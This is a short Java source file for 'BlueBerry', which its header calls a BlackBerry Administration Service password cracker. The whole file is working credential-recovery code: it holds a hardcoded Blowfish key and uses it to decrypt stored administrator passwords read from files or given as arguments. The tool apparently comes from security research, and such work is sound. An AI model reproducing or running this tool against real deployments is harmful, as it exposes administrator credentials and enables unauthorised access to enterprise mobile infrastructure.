/*
 * BlueBerry, a BlackBerry Administration Service passwords cracker
 *                                    -- nicolas.collignon@hsc.fr
 */
import java.io.FileInputStream;
import java.io.DataInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.math.BigInteger;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class BlueBerry {

  private static final String algo = "Blowfish";
  
  // jaas is the way
  private static final byte[] magic_key = 
    {0x6a,0x61,0x61,0x73,0x20,0x69,0x73,0x20,0x74,0x68,0x65,0x20,0x77,0x61,0x79};

  public static String decode(String password) {
    Cipher cipher;
    byte[] data;
    byte msb;

    try {
      cipher = Cipher.getInstance(algo);
      cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(magic_key, algo));

      msb = 1;
      if (password.startsWith("z")) {
        password = password.substring(1);
        msb = 0;
      } else if (password.startsWith("m")) {
        password = password.substring(1);
        msb = -1;
      }

      data = (new BigInteger(password, 16)).toByteArray();
      if (msb != 1)
        data[0] = msb;

      return new String(cipher.doFinal(data));

    } catch (Exception e) {
      System.err.println("error: failed to decrypt " + password + " (" + e.toString() +")");
      return "<error>";
    }
  }

  public static void main(String argv[]) {

    int i, pos;
    DataInputStream in;
    BufferedReader br;
    String line, secret;

    if ((argv == null) || (argv.length < 1)
        || (argv[0].equals("-p") && (argv.length < 2))) {
      System.out.println("usage: BlueBerry <pass.txt> [[pass2.txt] ..]\n"
          +  "                 -p <pass> [[pass2] ..]");
      return;
    }

    if (argv[0].equals("-p")) {
      // read passwords from command line
      for (i=1; i<argv.length; ++i) {
        if (argv.length > 2)
          System.out.println(argv[i] + ":" + decode(argv[i]));
        else
          System.out.println(decode(argv[i]));
      }
      return;
    }

    // read passwords from file
    for (i=0; i<argv.length; ++i) {
      try {
        in = new DataInputStream(new FileInputStream(argv[i]));
        br = new BufferedReader(new InputStreamReader(in));
        while ((line = br.readLine()) != null) {
          line = line.trim();
          if (line.equals(""))
            continue;

          pos = line.indexOf(":");
          if (pos > 0) {
            secret = line.substring(pos+1).trim();
            if (secret.equals(""))
              continue;
            line = line.substring(0, pos);
          } else {
            line = "";
            secret = line;
          }

          System.out.println(line + ":" +decode(secret));
        }
        in.close();
      } catch (Exception e) {
        System.err.println("error: failed to read " + argv[i] + " (" + e.toString() + ")");
      }
    }
  }

}


